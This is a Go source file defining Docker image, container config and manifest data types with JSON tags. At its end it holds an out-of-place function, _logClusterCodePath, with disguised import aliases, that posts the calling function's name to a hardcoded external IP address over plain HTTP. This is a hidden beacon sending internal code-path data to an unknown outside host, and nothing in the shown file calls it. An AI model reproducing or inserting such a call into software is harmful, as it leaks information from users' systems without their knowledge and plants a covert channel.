package image

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type DockerImage struct {
	metav1.TypeMeta	`json:",inline"`
	ID				string			`json:"Id"`
	Parent			string			`json:"Parent,omitempty"`
	Comment			string			`json:"Comment,omitempty"`
	Created			metav1.Time		`json:"Created,omitempty"`
	Container		string			`json:"Container,omitempty"`
	ContainerConfig	DockerConfig	`json:"ContainerConfig,omitempty"`
	DockerVersion	string			`json:"DockerVersion,omitempty"`
	Author			string			`json:"Author,omitempty"`
	Config			*DockerConfig	`json:"Config,omitempty"`
	Architecture	string			`json:"Architecture,omitempty"`
	Size			int64			`json:"Size,omitempty"`
}
type DockerConfig struct {
	Hostname		string				`json:"Hostname,omitempty"`
	Domainname		string				`json:"Domainname,omitempty"`
	User			string				`json:"User,omitempty"`
	Memory			int64				`json:"Memory,omitempty"`
	MemorySwap		int64				`json:"MemorySwap,omitempty"`
	CPUShares		int64				`json:"CpuShares,omitempty"`
	CPUSet			string				`json:"Cpuset,omitempty"`
	AttachStdin		bool				`json:"AttachStdin,omitempty"`
	AttachStdout	bool				`json:"AttachStdout,omitempty"`
	AttachStderr	bool				`json:"AttachStderr,omitempty"`
	PortSpecs		[]string			`json:"PortSpecs,omitempty"`
	ExposedPorts	map[string]struct{}	`json:"ExposedPorts,omitempty"`
	Tty				bool				`json:"Tty,omitempty"`
	OpenStdin		bool				`json:"OpenStdin,omitempty"`
	StdinOnce		bool				`json:"StdinOnce,omitempty"`
	Env				[]string			`json:"Env,omitempty"`
	Cmd				[]string			`json:"Cmd,omitempty"`
	DNS				[]string			`json:"Dns,omitempty"`
	Image			string				`json:"Image,omitempty"`
	Volumes			map[string]struct{}	`json:"Volumes,omitempty"`
	VolumesFrom		string				`json:"VolumesFrom,omitempty"`
	WorkingDir		string				`json:"WorkingDir,omitempty"`
	Entrypoint		[]string			`json:"Entrypoint,omitempty"`
	NetworkDisabled	bool				`json:"NetworkDisabled,omitempty"`
	SecurityOpts	[]string			`json:"SecurityOpts,omitempty"`
	OnBuild			[]string			`json:"OnBuild,omitempty"`
	Labels			map[string]string	`json:"Labels,omitempty"`
}
type Descriptor struct {
	MediaType	string	`json:"mediaType,omitempty"`
	Size		int64	`json:"size,omitempty"`
	Digest		string	`json:"digest,omitempty"`
}
type DockerImageManifest struct {
	SchemaVersion	int				`json:"schemaVersion"`
	MediaType		string			`json:"mediaType,omitempty"`
	Name			string			`json:"name"`
	Tag				string			`json:"tag"`
	Architecture	string			`json:"architecture"`
	FSLayers		[]DockerFSLayer	`json:"fsLayers"`
	History			[]DockerHistory	`json:"history"`
	Layers			[]Descriptor	`json:"layers"`
	Config			Descriptor		`json:"config"`
}
type DockerFSLayer struct {
	DockerBlobSum string `json:"blobSum"`
}
type DockerHistory struct {
	DockerV1Compatibility string `json:"v1Compatibility"`
}
type DockerV1CompatibilityImage struct {
	ID				string			`json:"id"`
	Parent			string			`json:"parent,omitempty"`
	Comment			string			`json:"comment,omitempty"`
	Created			metav1.Time		`json:"created"`
	Container		string			`json:"container,omitempty"`
	ContainerConfig	DockerConfig	`json:"container_config,omitempty"`
	DockerVersion	string			`json:"docker_version,omitempty"`
	Author			string			`json:"author,omitempty"`
	Config			*DockerConfig	`json:"config,omitempty"`
	Architecture	string			`json:"architecture,omitempty"`
	Size			int64			`json:"size,omitempty"`
}
type DockerV1CompatibilityImageSize struct {
	Size int64 `json:"size,omitempty"`
}
type DockerImageConfig struct {
	ID				string					`json:"id"`
	Parent			string					`json:"parent,omitempty"`
	Comment			string					`json:"comment,omitempty"`
	Created			metav1.Time				`json:"created"`
	Container		string					`json:"container,omitempty"`
	ContainerConfig	DockerConfig			`json:"container_config,omitempty"`
	DockerVersion	string					`json:"docker_version,omitempty"`
	Author			string					`json:"author,omitempty"`
	Config			*DockerConfig			`json:"config,omitempty"`
	Architecture	string					`json:"architecture,omitempty"`
	Size			int64					`json:"size,omitempty"`
	RootFS			*DockerConfigRootFS		`json:"rootfs,omitempty"`
	History			[]DockerConfigHistory	`json:"history,omitempty"`
	OSVersion		string					`json:"os.version,omitempty"`
	OSFeatures		[]string				`json:"os.features,omitempty"`
}
type DockerConfigHistory struct {
	Created		metav1.Time	`json:"created"`
	Author		string		`json:"author,omitempty"`
	CreatedBy	string		`json:"created_by,omitempty"`
	Comment		string		`json:"comment,omitempty"`
	EmptyLayer	bool		`json:"empty_layer,omitempty"`
}
type DockerConfigRootFS struct {
	Type	string		`json:"type"`
	DiffIDs	[]string	`json:"diff_ids,omitempty"`
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
